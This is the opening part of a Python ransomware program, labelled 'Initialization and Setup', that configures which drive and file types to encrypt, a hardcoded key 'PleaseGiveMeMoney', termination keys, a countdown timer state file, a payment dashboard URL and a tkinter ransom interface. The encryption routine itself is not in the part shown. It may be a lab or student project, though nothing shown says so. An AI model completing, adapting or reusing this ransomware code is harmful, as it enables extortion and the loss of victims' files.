# Part 1: Initialization and Setup

import os
import sys
import requests
import json
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import base64
import uuid
from datetime import datetime, timedelta
import time
import ctypes
import logging
import threading
import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog
from tkinter import ttk
from PIL import Image, ImageTk

# Step 1: Utility function to get the resource path
def resource_path(relative_path):
    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base_path, relative_path)

# Step 2: Ensure the time directory exists
def ensure_time_dir_exists():
    if not os.path.exists(TIME_DIR):
        os.makedirs(TIME_DIR)

# Step 3: Function to load the machine id
def load_machine_id():
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    for drive in drives:
        machine_id_path = os.path.join(drive, "Machine_id.txt")
        if os.path.exists(machine_id_path):
            try:
                with open(machine_id_path, 'r') as file:
                    machine_id = file.read().strip()
                    print(f"Machine ID loaded successfully from {machine_id_path}: {machine_id}")
                    return machine_id
            except FileNotFoundError:
                continue
    return None

# Global constants
TERMINATION_KEY = "bingo"
SECONDARY_TERMINATION_KEY = "stop"
HOME_DIR = os.path.expanduser('~')
TIME_DIR = os.path.join(HOME_DIR, '.cryptolock_time')
TIMER_STATE_FILE = os.path.join(TIME_DIR, 'timer_state.txt')
ICON_PATH = resource_path("img/app_icon.ico")
LOGO_PATH = resource_path("img/logo.png")
THANKS_PATH = resource_path("img/thank-you.png")

# Step 4: Ensure the time directory exists at the start
ensure_time_dir_exists()

# Encryption Configuration
DRIVES_TO_ENCRYPT = ['E:']
EXTENSIONS_TO_ENCRYPT = ['.txt', '.jpg', '.png', '.pdf', '.zip', '.rar', '.xlsx', '.docx']
PASSWORD_PROVIDED = 'PleaseGiveMeMoney'
DASHBOARD_URL = 'http://localhost'
MAX_ATTEMPTS = 10
DELAY = 5

# Step 5: Setup logging
logging.basicConfig(
    filename='encryption_log.txt',
    level=logging.INFO,
    format='%(asctime)s:%(levelname)s:%(message)s',
    filemode='w'
)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s:%(levelname)s:%(message)s')
console_handler.setFormatter(formatter)
logging.getLogger().addHandler(console_handler)
